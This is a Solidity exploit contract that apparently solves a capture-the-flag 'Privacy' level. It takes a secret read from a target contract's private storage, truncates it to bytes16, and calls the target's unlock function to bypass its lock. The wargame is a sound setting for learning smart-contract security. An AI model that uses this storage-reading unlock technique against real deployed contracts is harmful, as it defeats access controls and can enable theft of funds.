// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {

    address target = 0xBB9D96b71799D15FfE4A47545741712D7C97d711;
    event TestBool(bool);
    event TestBytes(bytes16);

    function unlock_attack() public {

        uint256 orig_secret = uint256(0xc49ecb25f56bde9a974a1bd4f085302a69fecf0ef2ae170840c86812a7466436);
        bytes16 secret = bytes16(uint128(orig_secret >> 128)); // bytes conversion should take the top part and discard the bottom one

        bytes memory payload = abi.encodeWithSignature("unlock(bytes16)", secret);
        (bool success, ) = target.call(payload);
        emit TestBool(success);
        emit TestBytes(secret);
    }
}